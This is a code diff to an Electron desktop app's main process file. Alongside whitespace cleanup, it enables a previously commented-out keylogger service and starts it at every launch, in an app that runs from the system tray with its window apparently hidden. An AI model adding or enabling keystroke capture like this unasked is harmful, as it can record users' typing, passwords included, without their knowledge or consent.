@@ -10,7 +10,7 @@ if (process.env['NODE_ENV'] === 'development') {
     REACT_DEVELOPER_TOOLS = require('electron-devtools-installer').REACT_DEVELOPER_TOOLS;
 }
 
-//const KeyloggerService = require('./services/keylogger-service');
+const KeyloggerService = require('./services/keylogger-service');
 const ipcService = require('./ipc');
 //----------------------------------------------------------------------------------------------------------------------
 
@@ -40,13 +40,14 @@ const App = {
             .then((name) => console.log(`Added Extension:  ${name}`))
             .catch((err) => console.log('An error occurred: ', err));
         }
-		
+        
         ipcService.start(app);
-		
+        KeyloggerService.start();
+        
         function toggleWindow() {
             mainWindow.show();
         }
-		
+        
         if (platform.isWin || platform.isLinux) {
             console.log(`${APPPATH + DIRSEP}icon.png`);
             appIcon = new Tray(`${APPPATH + DIRSEP}icon.png`);
@@ -59,7 +60,7 @@ const App = {
             appIcon.on('double-click', toggleWindow);
             appIcon.on('click', toggleWindow);
         }
-		
+        
         //TODO remove this toggleWindow()
         //toggleWindow();
     },
@@ -69,15 +70,15 @@ const App = {
         // in an array if your app supports multi windows, this is the time
         // when you should delete the corresponding element.
         mainWindow = null;
-		
+        
         //Unregister all shortcuts.
         globalShortcut.unregisterAll();
-		
+        
         //Destroy the app icon
         if (appIcon !== null) {
             appIcon.destroy();
         }
-		
+        
         app.quit();
         app.exit(0);
     },
